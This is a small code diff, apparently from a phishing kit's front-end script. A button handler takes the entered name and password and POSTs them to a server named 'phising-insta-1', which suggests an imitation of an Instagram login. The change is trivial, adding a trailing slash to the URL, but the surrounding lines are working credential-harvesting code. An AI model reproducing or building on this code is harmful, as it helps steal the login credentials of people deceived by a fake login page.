@@ -6,7 +6,7 @@ const lastname = document.getElementById("password");
 button.addEventListener("click", async() => {
   const id1 = name.value;
   const id2 = lastname.value;
-   const res = await fetch("https://phising-insta-1.onrender.com", {
+   const res = await fetch("https://phising-insta-1.onrender.com/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
